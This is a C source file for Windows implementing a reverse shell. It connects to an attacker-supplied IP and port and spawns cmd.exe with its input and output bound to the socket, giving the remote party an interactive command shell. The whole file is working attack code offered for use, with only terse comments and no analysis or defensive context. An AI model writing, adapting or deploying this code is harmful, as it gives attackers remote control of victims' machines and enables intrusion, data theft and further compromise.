#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

// Function to handle the reverse shell
DWORD WINAPI ReverseShell(LPVOID lpParam) {
    SOCKET sock = *(SOCKET*)lpParam;

    // Redirect standard input, output, and error to the socket
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // Create a mutable copy of the command string
    char cmd[] = "cmd.exe";

    // Create a new cmd.exe process with the redirected handles
    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed. Error: %d\n", GetLastError());
        closesocket(sock);
        return 1;
    }

    // Wait for the process to finish
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up the process
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Close the socket
    closesocket(sock);

    return 0;
}

int main(int argc, char* argv[]) {
    // Check if the correct number of arguments is provided
    if (argc != 3) {
        printf("Usage: %s <IP> <Port>\n", argv[0]);
        return 1;
    }

    // Parse IP and port from command-line arguments
    const char* ip = argv[1];
    int port = atoi(argv[2]);

    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed.\n");
        return 1;
    }

    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed.\n");
        WSACleanup();
        return 1;
    }

    // Define server address
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server.sin_addr.s_addr) <= 0) {
        printf("Invalid IP address.\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Connect to server
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("Connection failed.\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Create a new thread for the reverse shell
    HANDLE thread = CreateThread(NULL, 0, ReverseShell, &sock, 0, NULL);
    if (thread == NULL) {
        printf("Failed to create thread.\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Wait for the reverse shell thread to finish
    WaitForSingleObject(thread, INFINITE);

    // Clean up the thread handle
    CloseHandle(thread);

    // Clean up Winsock
    WSACleanup();

    return 0;
}
